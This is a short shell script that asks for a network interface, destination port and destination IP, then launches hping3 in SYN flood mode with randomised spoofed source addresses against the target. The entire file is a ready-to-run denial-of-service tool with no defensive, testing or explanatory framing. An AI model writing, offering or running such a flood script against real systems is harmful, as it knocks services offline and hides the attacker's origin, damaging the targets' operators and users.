echo enter interfce name
read inam
echo enter destintion port
read desport
echo enter destintion ip
read desip
sudo hping3 -S --flood --interface $inam --rand-source --destport $desport $desip 
